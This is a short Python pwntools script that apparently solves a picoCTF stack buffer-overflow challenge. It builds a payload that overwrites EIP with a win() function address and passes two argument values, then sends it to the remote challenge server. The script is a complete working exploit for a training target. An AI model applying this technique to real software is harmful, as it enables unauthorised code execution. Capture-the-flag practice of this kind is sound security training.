from pwn import *

# Inserting the EIP value
pattern = cyclic(cyclic_find('daab'))

# Filling the EIP with a function call address for Win(), containing the flag.
eip = p32(0x08049296)

# Creating padding
padding = b"CCCC"  # Padding of 4 bytes

# Adding the Arguments
a = p32(0xCAFEF00D)  # 0xCAFEF00D
a += p32(0xF00DF00D)  # 0xF00DF00D

# Creating the payload
payload = pattern + eip + padding + a
print(payload)

r = remote('saturn.picoctf.net', 60583)
r.recvuntil(b"Please enter your string: \n")
r.sendline(payload)
r.interactive()

